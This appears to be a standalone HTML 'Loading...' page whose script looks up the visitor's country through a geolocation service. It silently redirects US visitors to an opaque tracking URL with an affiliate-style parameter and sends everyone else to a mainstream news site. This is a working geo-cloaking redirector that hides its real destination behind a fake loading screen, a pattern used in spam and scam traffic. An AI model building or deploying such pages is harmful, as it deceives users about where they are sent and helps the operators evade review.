<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>

<style>
body {
    margin: 0;
    background: #0f2027;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    flex-direction: column;
    color: white;
    font-family: Arial, sans-serif;
}

.logo img {
    width: 120px;
    margin-bottom: 20px;
}

.loader {
    border: 4px solid #ddd;
    border-top: 4px solid #00ff99;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

p {
    margin-top: 15px;
    font-size: 14px;
    color: #ccc;
}
</style>

</head>
<body>

<div class="logo">
    <img src="https://i.ibb.co.com/C3stwJy8" alt="Logo">
</div>

<div class="loader"></div>
<p>Please wait...</p>

<script>
async function redirectUser() {
    try {
        let res = await fetch("https://ipapi.co/json/");
        let data = await res.json();

        let country = data.country;

        if (country === "US") {
            window.location.href = "https://www.af9m8trk.com/UBX12C64/L29128D9/?s1=jack";
        } else {
            window.location.href = "https://www.usatoday.com/";
        }

    } catch (error) {
        // fallback
        window.location.href = "https://www.usatoday.com/";
    }
}

// slight delay for smooth UX
setTimeout(redirectUser, 800);
</script>

</body>
</html>
